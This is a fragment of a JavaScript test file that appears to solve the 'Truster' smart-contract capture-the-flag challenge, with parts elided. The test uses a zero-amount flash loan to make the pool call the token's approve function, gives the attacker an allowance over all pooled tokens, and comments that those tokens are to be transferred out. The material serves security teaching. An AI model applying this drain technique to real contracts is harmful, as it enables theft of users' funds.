...
describe("[Challenge] Truster", function () {
  ...
  it("Exploit", async function () {
    ...
    //execute flash loan to execute approve function
    await this.pool.flashLoan(0, attacker.address, this.token.address, data);

    expect((await this.token.allowance(this.pool.address, attacker.address)).toString()).to.equal(
      TOKENS_IN_POOL
    );

    //transfer tokens from pool to attacker
